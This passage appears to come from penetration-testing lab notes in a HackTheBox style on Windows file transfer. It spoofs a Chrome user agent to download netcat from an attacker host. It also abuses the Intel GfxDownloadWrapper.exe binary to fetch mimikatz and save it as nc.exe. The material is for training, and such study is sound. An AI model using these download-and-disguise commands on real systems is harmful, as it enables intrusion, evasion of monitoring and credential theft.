#### Listing out User Agents
```powershell-session
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

#### Request with Chrome User Agent
```powershell-session
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

```shell-session
AhmaDb0x@htb[/htb]$ nc -lvnp 80
```

#### Transferring File with GfxDownloadWrapper.exe

LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:
```powershell-session
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

it is worth checking the [LOLBAS](https://lolbas-project.github.io/) project to find a suitable "file download" binary that exists in your environment. Linux's equivalent is the [GTFOBins](https://gtfobins.github.io/) project and is definitely also worth checking out. As of the time of writing, the GTFOBins project provides useful information on nearly 40 commonly installed binaries that can be used to perform file transfers.
